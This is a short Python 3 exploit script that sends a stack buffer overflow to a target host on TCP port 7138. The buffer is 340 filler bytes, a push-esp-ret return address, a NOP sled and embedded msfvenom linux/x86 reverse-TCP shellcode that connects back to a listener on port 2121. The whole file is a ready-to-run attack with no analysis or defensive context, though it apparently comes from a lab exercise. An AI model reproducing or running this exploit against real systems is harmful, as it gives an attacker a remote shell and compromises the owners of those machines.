#!/usr/bin/python3

import sys
import os
import socket
import struct


if len (sys.argv) != 2:
    print("[!] Insufficient amount of arguments.")
    print(f"[*] Usage: /usr/bin/python3 {sys.argv[0]} <host>")
    sys.exit (1)

host = sys.argv[1]


# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.x.xx LPORT=2121 -f py -b "\x00" EXITFUNC=thread
# Payload size: 95 bytes
# Final size of py file: 479 bytes

buf =  b""
buf += b"\xba\x3d\x8e\x98\x2b\xd9\xe1\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x12\x31\x57\x12\x03\x57\x12\x83\xfa"
buf += b"\x8a\x7a\xde\x35\x48\x8d\xc2\x66\x2d\x21\x6f\x8a"
buf += b"\x38\x24\xdf\xec\xf7\x27\xb3\xa9\xb7\x17\x79\xc9"
buf += b"\xf1\x1e\x78\xa1\xc1\x49\x4b\xf9\xaa\x8b\xac\xf1"
buf += b"\x63\x05\x4d\xb1\x12\x45\xdf\xe2\x69\x66\x56\xe5"
buf += b"\x43\xe9\x3a\x8d\x35\xc5\xc9\x25\xa2\x36\x01\xd7"
buf += b"\x5b\xc0\xbe\x45\xcf\x5b\xa1\xd9\xe4\x96\xa2"

push_esp_ret = struct.pack("<I", 0x41101503)

buffer = b"A" * 340 + push_esp_ret + b"\x90" * 10 + buf + b"\xff" * 2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 7138))
s.send(buffer)
s.recv(1024)
s.close()

print("[+] Payload sent. Check your listener...")